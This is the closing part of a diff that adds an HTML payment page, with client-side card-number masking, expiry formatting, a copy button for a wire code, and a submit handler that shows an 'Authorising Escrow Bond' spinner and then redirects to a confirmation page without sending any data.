+        badge.textContent = 'CARD';
+        badge.className = 'text-xs font-extrabold text-slate-600 bg-slate-100 px-2 py-0.5 rounded border border-slate-200';
+      }
+    }
+
+    function handleCardInput(input) {
+      let cleanDigits = input.value.replace(/\D/g, '').substring(0, 16);
+      input.setAttribute('data-raw', cleanDigits);
+      input.value = formatWithSpaces(cleanDigits);
+      isCardMasked = false;
+      updateEyeIcon(false);
+      updateCardBadge(cleanDigits);
+    }
+
+    function handleCardFocus(input) {
+      const raw = input.getAttribute('data-raw') || input.value.replace(/\D/g, '');
+      if (raw) {
+        input.value = formatWithSpaces(raw);
+        isCardMasked = false;
+        updateEyeIcon(false);
+      }
+    }
+
+    function handleCardBlur(input) {
+      const raw = input.getAttribute('data-raw') || input.value.replace(/\D/g, '');
+      if (raw && raw.length >= 8) {
+        input.value = getMaskedCard(raw);
+        isCardMasked = true;
+        updateEyeIcon(true);
+      }
+    }
+
+    function toggleCardMask() {
+      const input = document.getElementById('cardNumber');
+      const raw = input.getAttribute('data-raw') || input.value.replace(/\D/g, '');
+      if (!raw) return;
+
+      if (isCardMasked) {
+        input.value = formatWithSpaces(raw);
+        isCardMasked = false;
+        updateEyeIcon(false);
+      } else {
+        input.value = getMaskedCard(raw);
+        isCardMasked = true;
+        updateEyeIcon(true);
+      }
+    }
+
+    function updateEyeIcon(masked) {
+      const icon = document.getElementById('eyeIcon');
+      if (!icon) return;
+      if (masked) {
+        icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"></path>';
+      } else {
+        icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';
+      }
+    }
+
+    function formatExpiryInput(input) {
+      let v = input.value.replace(/\D/g, '').substring(0, 4);
+      if (v.length > 2) {
+        input.value = v.substring(0, 2) + ' / ' + v.substring(2);
+      } else {
+        input.value = v;
+      }
+    }
+
+    function copyWireCode(text, el) {
+      navigator.clipboard.writeText(text).then(() => {
+        const orig = el.textContent;
+        el.textContent = 'Copied!';
+        el.classList.add('text-emerald-600');
+        setTimeout(() => {
+          el.textContent = orig;
+          el.classList.remove('text-emerald-600');
+        }, 1500);
+      });
+    }
+
+    function handleFormSubmit(e) {
+      e.preventDefault();
+      const btn = document.getElementById('submitPaymentBtn');
+      const text = document.getElementById('submitBtnText');
+      const arrow = document.getElementById('submitBtnArrow');
+
+      btn.disabled = true;
+      btn.className = 'w-full h-14 bg-[#D92534]/80 text-white font-extrabold text-base rounded-2xl transition-all cursor-wait flex items-center justify-center gap-2';
+      arrow.classList.add('hidden');
+      text.innerHTML = '<svg class="ifc-spinner w-5 h-5 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-90" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg> Authorising Escrow Bond…';
+
+      setTimeout(() => {
+        // Save state for payment confirmation screen
+        sessionStorage.setItem('ifc_last_amount', currentAmount);
+        window.location.href = 'payment-received.html';
+      }, 1200);
+    }
+  </script>
+
+  <script id="ifc-stable-navigation">
+    (function () {
+      document.addEventListener('click', function (e) {
+        const el = e.target.closest('a,button'); if (!el) return;
+        if (el.hasAttribute('data-ifc-lang')) return;
+        const r = el.getAttribute('data-ifc-route');
+        if (r) { e.preventDefault(); window.location.href = r; }
+      });
+    })();
+  </script>
+</body>
+
+</html>
